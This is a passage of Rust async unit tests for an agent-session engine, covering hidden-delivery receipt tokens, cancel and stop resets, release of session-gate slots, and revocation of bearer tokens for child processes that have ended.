        assert_eq!(
            pending_hidden_rows_at_admission(&db, &inner)
                .await
                .unwrap()
                .len(),
            1
        );
        drop(inner);

        release_tx.send(()).unwrap();
        worker.await.unwrap();
        let inner = eng.lock().await;
        assert!(!inner.hidden_receipt_inflight.contains(&delivery_id));
        assert!(
            pending_hidden_rows_at_admission(&db, &inner)
                .await
                .unwrap()
                .is_empty()
        );
    }

    #[tokio::test]
    async fn hidden_receipt_error_releases_token_for_retry() {
        let db = Db::connect("sqlite::memory:").await.unwrap();
        let eng: EngineRef = Arc::new(tokio::sync::Mutex::new(test_inner("codex")));
        let key = -9_001_341_i64;
        let registry = {
            let mut inner = eng.lock().await;
            assert!(register_hidden_receipt(&mut inner, 19));
            inner.hidden_receipt_inflight.clone()
        };
        run_hidden_receipt_worker(
            db,
            eng.clone(),
            key,
            19,
            registry,
            async { Err(anyhow::anyhow!("injected rollback")) },
            std::time::Duration::from_secs(60),
            None,
        )
        .await;
        let inner = eng.lock().await;
        assert!(!inner.hidden_receipt_inflight.contains(&19));
        assert!(!hidden_delivery_is_duplicate(&inner, 19));
    }

    #[tokio::test]
    async fn hidden_receipt_panic_before_commit_releases_pending_row_for_retry() {
        let (db, eng, delivery_id) = durable_hidden_fixture("codex").await;
        let key = eng
            .lock()
            .await
            .session_id
            .map(i64::from)
            .expect("fixture assigns an isolated surface key");
        let registry = {
            let mut inner = eng.lock().await;
            assert!(register_hidden_receipt(&mut inner, delivery_id));
            inner.hidden_receipt_inflight.clone()
        };
        let worker = tokio::spawn(run_hidden_receipt_worker(
            db.clone(),
            eng.clone(),
            key,
            delivery_id,
            registry,
            async {
                panic!("injected panic before commit");
                #[allow(unreachable_code)]
                Ok(None)
            },
            std::time::Duration::from_secs(60),
            None,
        ));
        worker.await.unwrap();
        let inner = eng.lock().await;
        assert!(!inner.hidden_receipt_inflight.contains(&delivery_id));
        assert_eq!(
            pending_hidden_rows_at_admission(&db, &inner)
                .await
                .unwrap()
                .len(),
            1,
            "pending row remains authoritative after pre-commit panic"
        );
    }

    #[tokio::test]
    async fn hidden_receipt_panic_after_commit_clears_token_without_retry() {
        let (db, eng, delivery_id) = durable_hidden_fixture("codex").await;
        let key = eng
            .lock()
            .await
            .session_id
            .map(i64::from)
            .expect("fixture assigns an isolated surface key");
        let registry = {
            let mut inner = eng.lock().await;
            assert!(register_hidden_receipt(&mut inner, delivery_id));
            inner.hidden_receipt_inflight.clone()
        };
        let db_for_consume = db.clone();
        let worker = tokio::spawn(run_hidden_receipt_worker(
            db.clone(),
            eng.clone(),
            key,
            delivery_id,
            registry,
            async move {
                repo::consume_lead_hidden_delivery(&db_for_consume, delivery_id)
                    .await
                    .unwrap();
                panic!("injected panic after commit");
                #[allow(unreachable_code)]
                Ok(None)
            },
            std::time::Duration::from_secs(60),
            None,
        ));
        worker.await.unwrap();
        let inner = eng.lock().await;
        assert!(!inner.hidden_receipt_inflight.contains(&delivery_id));
        assert!(
            pending_hidden_rows_at_admission(&db, &inner)
                .await
                .unwrap()
                .is_empty(),
            "consumed row is not retried after post-commit panic"
        );
    }

    /// Registry replacement shares the per-surface receipt set with the old
    /// engine while its detached worker is alive. The worker releases the token
    /// only after its DB future reports a committed result or a definite error.
    #[tokio::test]
    async fn hidden_receipt_registry_is_shared_across_engine_replacement() {
        let key = -9_001_340_i64;
        let registry = hidden_receipt_registry_for_key(key);
        let replacement_registry = hidden_receipt_registry_for_key(key);
        assert!(Arc::ptr_eq(&registry, &replacement_registry));

        let mut old = test_inner("codex");
        old.hidden_receipt_inflight = registry.clone();
        mark_hidden_turn_started_with_delivery(&mut old, Some(37));
        assert!(register_hidden_receipt(&mut old, 37));
        drop(old);

        let mut replacement = test_inner("codex");
        replacement.hidden_receipt_inflight = replacement_registry.clone();
        assert!(
            hidden_delivery_is_duplicate(&replacement, 37),
            "replacement must honor an old task's in-flight token"
        );
        finish_hidden_receipt(&mut replacement, 37, false);
        assert!(
            !hidden_delivery_is_duplicate(&replacement, 37),
            "the worker outcome cleanup must release the shared token"
        );

        let concurrent_key = key + 10;
        let handles: Vec<_> = (0..16)
            .map(|_| tokio::spawn(async move {
                hidden_receipt_registry_for_key(concurrent_key)
            }))
            .collect();
        let registries: Vec<_> = futures::future::join_all(handles)
            .await
            .into_iter()
            .map(|result| result.expect("registry lookup task must finish"))
            .collect();
        assert!(
            registries
                .windows(2)
                .all(|pair| Arc::ptr_eq(&pair[0], &pair[1])),
            "same-key concurrent constructors must share one registry"
        );
        drop(registries);

        let stale_key = key + 11;
        let stale = hidden_receipt_registry_for_key(stale_key);
        drop(stale);
        let _ = hidden_receipt_registry_for_key(key);
        assert!(
            !ENGINE_HIDDEN_RECEIPTS
                .get()
                .is_some_and(|registries| registries.contains_key(&stale_key)),
            "expired receipt registry keys must be pruned"
        );
    }

    /// A failed durable consume releases the admission reservation and rearms
    /// only the current hidden turn's activity gate. The pending row can then
    /// be retried instead of being permanently hidden behind a stale token.
    #[test]
    fn failed_hidden_receipt_releases_retry_token() {
        let mut inner = test_inner("claude");
        mark_hidden_turn_started_with_delivery(&mut inner, Some(17));
        assert!(register_hidden_receipt(&mut inner, 17));
        assert!(inner.clock.mark_consumed_once());
        finish_hidden_receipt(&mut inner, 17, false);
        assert!(!inner.hidden_receipt_inflight.contains(&17));
        assert_eq!(inner.turn_user_row, Some(-17));
        assert!(inner.clock.mark_consumed_once(), "failure rearms this turn");
        assert!(
            hidden_delivery_is_duplicate(&inner, 17),
            "the active hidden turn still represents this row"
        );
        let next = inner.turn.on_turn_end();
        advance_dequeued_turn(&mut inner, &next);
        assert!(!hidden_delivery_is_duplicate(&inner, 17));
    }

    /// No activity means no in-flight receipt token. A clean TurnEnd may clear
    /// the hidden marker and the next visible admission is therefore allowed to
    /// replay the still-pending durable row.
    #[tokio::test]
    async fn hidden_turn_end_without_activity_allows_pending_retry() {
        let (db, eng, delivery_id) = durable_hidden_fixture("omp").await;
        let mut inner = eng.lock().await;
        mark_hidden_turn_started_with_delivery(&mut inner, Some(delivery_id));
        let next = inner.turn.on_turn_end();
        assert!(next.is_none());
        advance_dequeued_turn(&mut inner, &next);
        assert_eq!(inner.turn_user_row, None);
        assert!(!hidden_delivery_is_duplicate(&inner, delivery_id));
        assert_eq!(
            pending_hidden_rows_at_admission(&db, &inner)
                .await
                .unwrap()
                .len(),
            1,
            "the pending durable row is eligible for retry"
        );
    }

    /// The token is independent of transport shape: resident Claude, per-turn
    /// Codex/OpenCode, and ACP connection sessions all use the same production
    /// duplicate predicate after TurnEnd retargets the marker.
    #[test]
    fn inflight_hidden_receipt_blocks_replay_for_all_transports() {
        for tool in ["claude", "codex", "opencode", "omp"] {
            let mut inner = test_inner(tool);
            mark_hidden_turn_started_with_delivery(&mut inner, Some(31));
            assert!(register_hidden_receipt(&mut inner, 31));
            let next = inner.turn.on_turn_end();
            advance_dequeued_turn(&mut inner, &next);
            assert_eq!(inner.turn_user_row, None, "{tool}: marker retargeted");
            assert!(
                hidden_delivery_is_duplicate(&inner, 31),
                "{tool}: receipt token survives marker clear"
            );
            finish_hidden_receipt(&mut inner, 31, true);
            assert!(!hidden_delivery_is_duplicate(&inner, 31), "{tool}: token released");
        }
    }

    #[test]
    fn background_hidden_admission_keeps_stopped_resident_and_per_turn_engines_stopped() {
        for tool in ["claude", "opencode"] {
            let mut inner = test_inner(tool);
            inner.stopped = true;
            assert_eq!(
                hidden_delivery(tool, false, false, true),
                HiddenDelivery::Noop,
                "{tool}: background replay must not revive a stopped engine"
            );
            assert!(!hidden_turn_admissible(&inner), "{tool}: stopped guard");
        }
    }

    #[test]
    fn reset_failed_hidden_turn_clears_busy_state_for_same_turn() {
        let mut inner = test_inner("claude");
        inner.current_origin_tag = Some("stale".into());
        inner.turn.queue.push_back(Outgoing {
            text: "queued user".into(),
            images: vec![],
            tracked: true,
            origin_tag: None,
            queue_id: None,
            has_attachments: false,
            local_image_paths: Vec::new(),
        });
        let turn_id = mark_hidden_turn_started_with_delivery(&mut inner, Some(9));
        assert_eq!(inner.turn_user_row, Some(-9));

        assert!(reset_failed_hidden_turn(&mut inner, turn_id).is_some());

        assert!(!inner.turn.busy);
        assert!(inner.turn.queue.is_empty());
        assert!(
            inner.clock.started_millis > 0,
            "telemetry remains read-only history"
        );
        assert!(inner.current_origin_tag.is_none());
        assert!(inner.current.is_none());
        assert!(!inner.interrupting);
        assert_eq!(inner.turn_user_row, None);
    }

    #[test]
    fn reset_failed_hidden_turn_ignores_later_turn() {
        let mut inner = test_inner("claude");
        let old_turn = mark_hidden_turn_started(&mut inner);
        inner.turn_id += 1;

        assert!(reset_failed_hidden_turn(&mut inner, old_turn).is_none());
        assert!(inner.turn.busy);
    }

    /// The explicit Stop fallback clears every turn-owned field before a later
    /// send is admitted; it must not remain queued behind the cancelled turn.
    #[test]
    fn reset_ignored_cancel_turn_clears_state_and_unblocks_next_send() {
        let mut inner = test_inner("codex");
        inner.turn.busy = true;
        inner.turn_id = 5;
        inner.interrupting = true; // set by `interrupt()` just before this fires
        inner.current_origin_tag = Some("im-reply-target".into());
        inner.current = Some((10, "partial reply".into(), std::time::Instant::now()));
        // agent_thread: Some(..) — a sub-agent's own stream cancelled mid-turn
        // must keep its tag through this reset path too, exactly like
        // cleanup_disconnected_turn / stop_quiet.
        inner.open_texts.insert(
            "item-1".into(),
            OpenTextRow {
                row: 11,
                buf: "parallel stream".into(),
                last_flush: std::time::Instant::now(),
                agent_thread: Some("sub-1".into()),
            },
        );
        inner
            .tool_rows
            .insert("call-1".into(), (12, serde_json::json!({"tool": "bash"})));
        inner.turn.queue.push_back(Outgoing {
            text: "follow-up sent during cancellation".into(),
            images: vec![],
            tracked: true,
            origin_tag: None,
            queue_id: Some(99),
            has_attachments: false,
            local_image_paths: Vec::new(),
        });

        let drain = reset_ignored_cancel_turn(&mut inner, 5).expect("same turn, still busy");

        // Idle and resumable, NOT stop_quiet's harder `stopped=true` state.
        assert!(!inner.turn.busy);
        assert!(!inner.stopped);
        assert!(!inner.interrupting);
        assert!(inner.tool_rows.is_empty());
        assert!(inner.open_texts.is_empty());
        assert!(inner.current.is_none());
        assert!(inner.turn.queue.is_empty());
        assert!(inner.current_origin_tag.is_none());
        // "Continuity reset", not a STOP: reset_epoch stays put so an
        // in-flight Phase 1 -> Phase 3 send still promotes cleanly onto this
        // fresh idle engine instead of being invalidated (see the doc
        // comment on `reset_ignored_cancel_turn`).
        assert_eq!(inner.reset_epoch, 0);
        // The literal ask from review round 2: a subsequent send must NOT be
        // silently queued behind the cancelled turn.
        assert!(inner.turn.try_begin_send());

        assert_eq!(drain.current, Some((10, "partial reply".into())));
        assert_eq!(
            drain.orphan_texts,
            vec![(11, "parallel stream".into(), Some("sub-1".into()))]
        );
        assert_eq!(
            drain.orphan_tools,
            vec![(12, serde_json::json!({"tool": "bash"}))]
        );
        assert_eq!(drain.drained_queue, vec![99]);
    }

    /// A delayed clean TurnEnd (or a promoted queued send) can advance
    /// `turn_id` while the Stop fallback is waiting. The reset
    /// must not destroy a newer, unrelated turn's state.
    #[test]
    fn reset_ignored_cancel_turn_ignores_a_newer_turn() {
        let mut inner = test_inner("codex");
        inner.turn.busy = true;
        inner.turn_id = 6;
        inner
            .tool_rows
            .insert("call-1".into(), (1, serde_json::json!({"tool": "bash"})));

        assert!(reset_ignored_cancel_turn(&mut inner, 5).is_none());

        assert!(inner.turn.busy);
        assert!(!inner.tool_rows.is_empty());
    }

    /// The cancelled turn may have ended cleanly on its own (a delayed TurnEnd
    /// landing between the cancel request and this reset running) — the
    /// normal TurnEnd handler already reset everything correctly in that
    /// case, so this must be a no-op rather than a redundant/conflicting one.
    #[test]
    fn reset_ignored_cancel_turn_ignores_an_already_idle_turn() {
        let mut inner = test_inner("codex");
        inner.turn_id = 5;
        inner.turn.busy = false;

        assert!(reset_ignored_cancel_turn(&mut inner, 5).is_none());
    }

    // ---- session_gate: a cleared `child` must hand its slot back ----
    //
    // `session_gate`'s own tests only cover the semaphore primitives; nothing
    // asserted that the ENGINE actually releases what it acquires. That gap is
    // what let `stop_quiet` / `invalidate_resident` / the resident-death and
    // disconnect resets each keep a slot on a process they had just killed —
    // permanently, since `gate()` is a process-wide `OnceLock` singleton.
    // These tests measure the only thing a leak changes: whether the count
    // comes back. They serialize on `gate_test_lock` because that shared static
    // makes an exact before/after delta meaningless otherwise.

    fn slots_used() -> usize {
        crate::session_gate::active_session_slots().0
    }

    /// Take a real slot off the process-wide gate and park it exactly where a
    /// spawn parks it, asserting the gate registered it — so a test that later
    /// sees `baseline` is seeing a release, not a slot that was never taken.
    async fn park_a_real_slot(inner: &mut EngineInner, baseline: usize) {
        inner.child_permit = crate::session_gate::acquire_session_slot().await;
        assert!(
            inner.child_permit.is_some(),
            "the gate must hand out a slot to test with"
        );
        assert_eq!(slots_used(), baseline + 1, "a live session holds a slot");
    }

    /// End-to-end, through the real `stop_quiet` that every explicit Stop
    /// funnels into: after the stop, the gate is back where it started.
    ///
    /// The user-visible bug this pins: Stop is a high-frequency button, and a
    /// stopped session may never send again. Holding its slot until a respawn
    /// that never comes means the default ceiling of 8 erodes one ghost at a
    /// time, and new sessions eventually queue behind sessions that ended
    /// hours ago — with the resource dashboard (issue #112) reporting an
    /// active-session count that never falls back.
    #[tokio::test]
    async fn stop_quiet_releases_the_session_gate_slot() {
        let _serialized = crate::session_gate::gate_test_lock().lock().await;
        let baseline = slots_used();
        let mut inner = test_inner("claude");
        park_a_real_slot(&mut inner, baseline).await;
        let eng: EngineRef = Arc::new(tokio::sync::Mutex::new(inner));

        let _ = stop_quiet(&eng).await;

        assert_eq!(
            slots_used(),
            baseline,
            "an explicit stop must hand the slot back to the gate"
        );
        assert!(eng.lock().await.child_permit.is_none());
    }

    /// Give `inner` a distinct computer identity and mint the bearer its
    /// (notional) child was launched with. Returns that bearer; compare it
    /// against `computer_session_token` for the same identity afterwards —
    /// equal means the generation never moved and the dead child's token is
    /// still live.
    fn mint_bearer_for(inner: &mut EngineInner, thread: i32) -> String {
        inner.thread_id = thread;
        inner.worktree_id = None;
        let minted = crate::bus::computer_srv::rotate_and_mint_computer_session_token(
            thread,
            &inner.ask_dir,
            None,
        );
        // Exactly what `refresh_computer_injection` does: the stamp is what
        // makes this engine's teardown able to revoke, and only its own.
        inner.computer_gen = Some(minted.generation);
        minted.token
    }

    fn bearer_is_live(inner: &EngineInner, minted: &str) -> bool {
        crate::bus::computer_srv::computer_session_token(
            inner.thread_id,
            &inner.ask_dir,
            inner.worktree_id,
        ) == minted
    }

    /// Every teardown that releases the slot also kills the bearer. The two
    /// are one helper (`release_child_slot`) precisely so this list can't
    /// diverge from `child_permit`'s enumeration — so assert the pairing on
    /// each synchronous member of it rather than on the helper alone.
    #[tokio::test]
    async fn the_synchronous_teardowns_revoke_the_dead_child_bearer() {
        let mut wedged = test_inner("claude");
        let wedged_bearer = mint_bearer_for(&mut wedged, 951_101);
        assert!(bearer_is_live(&wedged, &wedged_bearer));
        invalidate_resident(&mut wedged);
        assert!(
            !bearer_is_live(&wedged, &wedged_bearer),
            "an invalidated resident's bearer must not survive the kill"
        );

        let mut hidden = test_inner("claude");
        let hidden_bearer = mint_bearer_for(&mut hidden, 951_201);
        let turn_id = mark_hidden_turn_started(&mut hidden);
        assert!(reset_failed_hidden_turn(&mut hidden, turn_id).is_some());
        assert!(
            !bearer_is_live(&hidden, &hidden_bearer),
            "a rolled-back hidden spawn's bearer must not survive"
        );

        let mut cancelled = test_inner("codex");
        let cancelled_bearer = mint_bearer_for(&mut cancelled, 951_301);
        cancelled.turn.busy = true;
        cancelled.turn_id = 5;
        assert!(reset_ignored_cancel_turn(&mut cancelled, 5).is_some());
        assert!(
            !bearer_is_live(&cancelled, &cancelled_bearer),
            "an ignored-cancel recovery's bearer must not survive"
        );
    }

    /// The ownership guards protect the bearer, not just the permit. A stale
    /// caller that no longer owns the turn must leave the CURRENT child's
    /// bearer alone — revoking it would 401 every computer call from a
    /// perfectly healthy session, which is louder than the leaked slot the
    /// same guard was originally written for.
    #[tokio::test]
    async fn a_teardown_for_a_turn_it_no_longer_owns_leaves_the_bearer_live() {
        let mut newer = test_inner("codex");
        let live_bearer = mint_bearer_for(&mut newer, 951_401);
        newer.turn.busy = true;
        newer.turn_id = 6; // advanced past the turn_id=5 being recovered

        assert!(reset_ignored_cancel_turn(&mut newer, 5).is_none());

        assert!(
            bearer_is_live(&newer, &live_bearer),
            "the running turn's bearer must outlive a stale recovery attempt"
        );
    }

    /// A codex app-server is the one child of this engine whose death the
    /// `child_permit` teardown list does not cover, and putting its revoke
    /// inside `cleanup_disconnected_turn` alone would not do: that cleanup
    /// skips an engine whose turn state is untouched, which is precisely an
    /// app-server that died BETWEEN turns and is never reconnected. Pin both
    /// halves — the skip, and that the disconnect revoke still lands on such an
    /// engine.
    #[tokio::test]
    async fn a_codex_disconnect_between_turns_still_kills_the_bearer() {
        let mut idle = test_inner("codex");
        let bearer = mint_bearer_for(&mut idle, 951_601);
        assert!(
            turn_state_is_untouched(&idle),
            "an app-server dying between turns leaves nothing for the cleanup to do"
        );

        revoke_engine_bearer(&mut idle);

        assert!(
            !bearer_is_live(&idle, &bearer),
            "the disconnected app-server's bearer must not outlive it"
        );

        let mut mid_turn = test_inner("codex");
        mid_turn.turn.busy = true;
        assert!(
            !turn_state_is_untouched(&mid_turn),
            "a disconnect mid-turn still has a turn to tear down"
        );
    }

    /// The identity is SHARED, the bearer is not. `(thread, ask_dir,
    /// worktree_id)` is `(thread, direction, worktree)` for a worker, so a
    /// second session opened on the same direction and worktree lands on the
    /// same identity while the first engine's child is still winding down. Its
    /// teardown must not take the replacement's live bearer with it — no
    /// per-engine counter can see the collision, because each engine's
    /// `generation`/`turn_id` agree that its own teardown is legitimate.
    #[tokio::test]
    async fn a_stale_engines_teardown_leaves_a_replacements_bearer_alone() {
        let mut first = test_inner("claude");
        let first_bearer = mint_bearer_for(&mut first, 951_701);

        // A second engine opens on the SAME identity and mints, which rotates
        // the shared generation out from under the first.
        let mut second = test_inner("claude");
        second.ask_dir = first.ask_dir.clone();
        let second_bearer = mint_bearer_for(&mut second, 951_701);
        assert!(!bearer_is_live(&first, &first_bearer), "rotation already killed it");
        assert!(bearer_is_live(&second, &second_bearer));

        // NOW the first engine's child finally exits.
        invalidate_resident(&mut first);

        assert!(
            bearer_is_live(&second, &second_bearer),
            "the replacement's bearer must survive the predecessor's teardown"
        );
    }

    /// A mint whose child never starts is not somebody else's problem. Every
    /// spawn path re-mints right before launching, so a launch that then fails
    /// leaves a current, valid bearer — and a written config — belonging to a
    /// process that does not exist. `revoke_if_spawn_failed` is what closes it
    /// at the spawn rather than hoping a rollback runs.
    #[tokio::test]
    async fn a_mint_whose_spawn_fails_is_revoked_at_the_failure() {
        let mut inner = test_inner("claude");
        let stillborn = mint_bearer_for(&mut inner, 951_801);
        assert!(bearer_is_live(&inner, &stillborn));

        let failed: Result<(), std::io::Error> = Err(std::io::Error::other("no such cwd"));
        assert!(revoke_if_spawn_failed(&mut inner, failed).is_err());

        assert!(
            !bearer_is_live(&inner, &stillborn),
            "a bearer minted for a child that never started must not stay valid"
        );
    }

    /// The mirror: a spawn that SUCCEEDS must keep its freshly minted bearer,
    /// or every session would 401 on its first computer call.
    #[tokio::test]
    async fn a_successful_spawn_keeps_the_bearer_it_was_minted() {
        let mut inner = test_inner("claude");
        let live = mint_bearer_for(&mut inner, 951_901);

        let ok: Result<(), std::io::Error> = Ok(());
        assert!(revoke_if_spawn_failed(&mut inner, ok).is_ok());

        assert!(bearer_is_live(&inner, &live), "a launched child keeps its bearer");
    }

    /// A LIVE app-server client holds this engine's bearer, and a child
    /// teardown does not destroy it — the next turn reuses that same client
    /// WITHOUT refreshing its injection. Revoking on a turn rollback would 401
    /// an otherwise healthy connection until it is rebuilt.
    #[tokio::test]
    async fn a_turn_rollback_spares_the_bearer_of_a_surviving_codex_client() {
        let mut inner = test_inner("codex");
        let client_bearer = mint_bearer_for(&mut inner, 952_001);
        inner.codex_client = Some(crate::codex_app_server::Client::disconnected_for_test());
        let turn_id = mark_hidden_turn_started(&mut inner);

        assert!(reset_failed_hidden_turn(&mut inner, turn_id).is_some());

        assert!(
            bearer_is_live(&inner, &client_bearer),
            "the surviving client's bearer must outlive the rolled-back turn"
        );
        assert!(inner.child_permit.is_none(), "the slot still goes back");
    }

    /// Revoking twice around an unlocked teardown (Stop revokes before
    /// releasing the lock for the ACP cancel, and again after re-locking) must
    /// not consume a generation somebody else minted in between. The stamp is
    /// taken by the first call, so the second is inert.
    #[tokio::test]
    async fn a_second_revoke_before_the_next_mint_is_inert() {
        let mut stopping = test_inner("claude");
        let doomed = mint_bearer_for(&mut stopping, 952_101);
        revoke_engine_bearer(&mut stopping);
        assert!(!bearer_is_live(&stopping, &doomed));

        // Somebody else takes over the identity while Stop is mid-teardown.
        let mut taker = test_inner("claude");
        taker.ask_dir = stopping.ask_dir.clone();
        let takers_bearer = mint_bearer_for(&mut taker, 952_101);

        revoke_engine_bearer(&mut stopping);

        assert!(
            bearer_is_live(&taker, &takers_bearer),
            "a repeat revoke must not reach past its own generation"
        );
    }

    /// Revoking an identity that never minted is a no-op, so the uniform
    /// teardown costs nothing for engines that never had the tool — a
    /// concierge/curator lead, or a worker with an unresolved worktree. Guards
    /// the "just call it everywhere" simplification the helper is built on.
    #[tokio::test]
    async fn tearing_down_an_engine_that_never_had_the_tool_is_harmless() {
        let mut inner = test_inner("claude");
        inner.thread_id = 951_501;
        inner.worktree_id = None;
        assert!(inner.computer_args.is_empty() && inner.computer_env.is_empty());

        invalidate_resident(&mut inner);

        assert!(inner.child_permit.is_none());
    }

    /// `invalidate_resident` kills a wedged resident so the next send respawns
    /// clean. A resident whose stdin keeps timing out gets invalidated over and
    /// over — one leaked slot per invalidation would exhaust the gate fastest
    /// of all the leak sites.
    #[tokio::test]
    async fn invalidate_resident_releases_the_session_gate_slot() {
        let _serialized = crate::session_gate::gate_test_lock().lock().await;
        let baseline = slots_used();
        let mut inner = test_inner("claude");
        park_a_real_slot(&mut inner, baseline).await;

        invalidate_resident(&mut inner);

        assert_eq!(
            slots_used(),
            baseline,
            "the killed resident's slot comes back"
        );
        assert!(inner.child_permit.is_none());
    }

    /// A failed hidden turn drops `child` — which kills it, `kill_on_drop` —
    /// so the slot goes too.
    #[tokio::test]
    async fn reset_failed_hidden_turn_releases_the_session_gate_slot() {
        let _serialized = crate::session_gate::gate_test_lock().lock().await;
        let baseline = slots_used();
        let mut inner = test_inner("claude");
        park_a_real_slot(&mut inner, baseline).await;
        let turn_id = mark_hidden_turn_started(&mut inner);

        assert!(reset_failed_hidden_turn(&mut inner, turn_id).is_some());

        assert_eq!(slots_used(), baseline);
        assert!(inner.child_permit.is_none());
    }

    /// The ignored-cancel fallback releases the slot inside its turn_id+busy
    /// guard. The owned turn hands its slot back while a newer turn keeps its
    /// own; releasing outside the guard could under-count a live child.
    #[tokio::test]
    async fn reset_ignored_cancel_turn_releases_the_slot_only_for_the_turn_it_owns() {
        let _serialized = crate::session_gate::gate_test_lock().lock().await;
        let baseline = slots_used();

        let mut owned = test_inner("codex");
        owned.turn.busy = true;
        owned.turn_id = 5;
        park_a_real_slot(&mut owned, baseline).await;
        assert!(reset_ignored_cancel_turn(&mut owned, 5).is_some());
        assert_eq!(
            slots_used(),
            baseline,
            "the cancelled turn's slot comes back"
        );
        assert!(owned.child_permit.is_none());

        let mut newer = test_inner("codex");
        newer.turn.busy = true;
        newer.turn_id = 6; // advanced past the turn_id=5 being recovered
        park_a_real_slot(&mut newer, baseline).await;
        assert!(reset_ignored_cancel_turn(&mut newer, 5).is_none());
        assert_eq!(
            slots_used(),
            baseline + 1,
            "a newer turn keeps the slot its child is still using"
        );
        assert!(newer.child_permit.is_some());
    }

    #[tokio::test]
    async fn write_user_reports_missing_stdin() {
        let mut inner = test_inner("claude");
        let out = Outgoing {
            text: "hello".into(),
            images: vec![],
            tracked: false,
            origin_tag: None,
            queue_id: None,
            has_attachments: false,
            local_image_paths: Vec::new(),
        };

        let err = write_user(&mut inner, &out).await.unwrap_err();

        assert!(err.to_string().contains("resident stdin is unavailable"));
    }

    #[test]
    fn hidden_delivery_spawns_for_per_turn_tools_without_stdin() {
        assert_eq!(
            hidden_delivery("codex", false, false, false),
            HiddenDelivery::SpawnTurn
        );
        assert_eq!(
            hidden_delivery("opencode", false, false, false),
            HiddenDelivery::SpawnTurn
        );
        // ACP connection tools also have no resident stdin when idle.
        assert_eq!(
            hidden_delivery("omp", false, false, false),
            HiddenDelivery::SpawnTurn
        );
    }

    #[test]
    fn hidden_delivery_keeps_resident_and_queue_semantics() {
        assert_eq!(
            hidden_delivery("claude", false, true, false),
            HiddenDelivery::WriteResident
        );
        assert_eq!(
            hidden_delivery("claude", false, false, false),
            HiddenDelivery::Noop
        );
        assert_eq!(
            hidden_delivery("codex", true, false, false),
            HiddenDelivery::Queue
        );
        assert_eq!(
            hidden_delivery("omp", true, false, false),
            HiddenDelivery::Queue
        );
    }

    #[test]
    fn hidden_delivery_rejects_stopped_per_turn_engines() {
        assert_eq!(
            hidden_delivery("codex", false, false, true),
            HiddenDelivery::Noop
        );
        assert_eq!(
            hidden_delivery("omp", false, false, true),
            HiddenDelivery::Noop
        );
    }

    #[test]
    fn send_reservation_valid_requires_stopped_turn_and_busy_flag() {
        let mut inner = test_inner("claude");
        inner.turn_id = 5;
        inner.turn.busy = true;
        let direct_ctx = SendContext {
            thread_id: 1,
            session_id: None,
            turn: 5,
            direct: true,
            is_command: false,
            tool: "claude".into(),
            origin_tag: None,
            reset_epoch: 0,
        };
        assert!(send_reservation_valid(&inner, &direct_ctx));

        // A reset_epoch bump (a stop/reset since Phase 1 — including a stop that was
        // immediately restarted, which leaves turn_id/busy looking valid) invalidates
        // BOTH a direct and a queued reservation.
        inner.reset_epoch = 1;
        assert!(!send_reservation_valid(&inner, &direct_ctx));
        assert!(!send_reservation_valid(
            &inner,
            &SendContext {
                direct: false,
                ..direct_ctx.clone()
            }
        ));
        inner.reset_epoch = 0;

        // An interrupt mid-send cancels a DIRECT reservation (the direct send IS the
        // current turn), but not a queued one, which targets a later turn.
        inner.interrupting = true;
        assert!(!send_reservation_valid(&inner, &direct_ctx));
        assert!(send_reservation_valid(
            &inner,
            &SendContext {
                direct: false,
                ..direct_ctx.clone()
            }
        ));
        inner.interrupting = false;

        // Stopped engine invalidates any reservation.
        inner.stopped = true;
        assert!(!send_reservation_valid(&inner, &direct_ctx));
        inner.stopped = false;

        // Turn identity mismatch means the reservation was reset.
        inner.turn_id = 6;
        assert!(!send_reservation_valid(&inner, &direct_ctx));
        inner.turn_id = 5;

        // Direct send must still hold the busy flag it reserved.
        inner.turn.busy = false;
        assert!(!send_reservation_valid(&inner, &direct_ctx));
        inner.turn.busy = true;

        // Queued sends don't own the busy flag: the enqueue/promote/cancel decision
        // is made at Phase 3 commit time from CURRENT state, so validation lets them
        // through regardless of turn advance (turn_id) or the turn having ended
        // (busy=false → Phase 3 promotes instead of stranding the message).
        let queued_ctx = SendContext {
            direct: false,
            ..direct_ctx
        };
        assert!(send_reservation_valid(&inner, &queued_ctx)); // busy = true
        inner.turn_id = 6; // active turn advanced, still busy → tolerated
        assert!(send_reservation_valid(&inner, &queued_ctx));
        inner.turn.busy = false; // turn ended → still valid; Phase 3 promotes
        assert!(send_reservation_valid(&inner, &queued_ctx));
        inner.turn.busy = true;
        // An explicit stop still invalidates a queued reservation.
        inner.stopped = true;
        assert!(!send_reservation_valid(&inner, &queued_ctx));
    }

    #[test]
    fn promote_queued_reservation_claims_a_fresh_direct_turn() {
        let mut inner = test_inner("claude");
        inner.turn_id = 7;
        assert!(!inner.turn.busy, "precondition: engine idle");
        let promoted = promote_queued_reservation(&mut inner, Some("tag".into()));
        assert_eq!(promoted, 8, "promotion claims the NEXT turn id");
        assert_eq!(inner.turn_id, 8);
        assert!(inner.turn.busy, "promotion reserves the turn (busy)");
        assert_eq!(inner.current_origin_tag.as_deref(), Some("tag"));
        assert!(
            inner.clock.started_millis > 0,
            "promotion records OCC telemetry"
        );
    }

    fn queued_outgoing(queue_id: i32, origin_tag: &str) -> Outgoing {
        Outgoing {
            text: "text".into(),
            origin_tag: Some(origin_tag.into()),
            queue_id: Some(queue_id),
            ..Default::default()
        }
    }

    /// PR #117 review, P1: reproduces the exact scenario from a real per-turn
    /// dialect's kill-only interrupt (opencode always; codex without the
    /// app-server) — turn A is interrupted, B sits queued behind it, A's
    /// stdout then EOFs and `on_turn_end` dequeues B. Without
    /// `advance_dequeued_turn` retargeting `turn_user_row`, the pointer would
    /// still read A: B's first activity would then mis-mark A "consumed" (A
    /// never ran again) while B's own row — the one the agent actually
    /// processed — stayed "delivered" forever. That is the exact
    /// delivered/consumed truth-inversion issue #94 exists to prevent.
    #[test]
    fn advance_dequeued_turn_retargets_from_the_finished_turn_to_the_dequeued_one() {
        let mut inner = test_inner("opencode");
        // Turn A just finished (interrupted): its bookkeeping is still live
        // until on_turn_end + advance_dequeued_turn catch up.
        inner.turn_user_row = Some(1); // A's message id
        inner.current_origin_tag = Some("a-tag".into());
        inner.turn.busy = true;
        inner.turn.queue.push_back(queued_outgoing(2, "b-tag")); // B's message id

        let next = inner.turn.on_turn_end(); // pops B
        advance_dequeued_turn(&mut inner, &next);

        assert_eq!(
            inner.turn_user_row,
            Some(2),
            "must retarget to B's row, not linger on A's finished turn"
        );
        assert_eq!(inner.current_origin_tag.as_deref(), Some("b-tag"));
    }

    /// The other half of the same bookkeeping: a drained queue must clear
    /// `turn_user_row`/`current_origin_tag` rather than leave them pointing at
    /// the turn that just ended — an idle engine must not attribute a LATER,
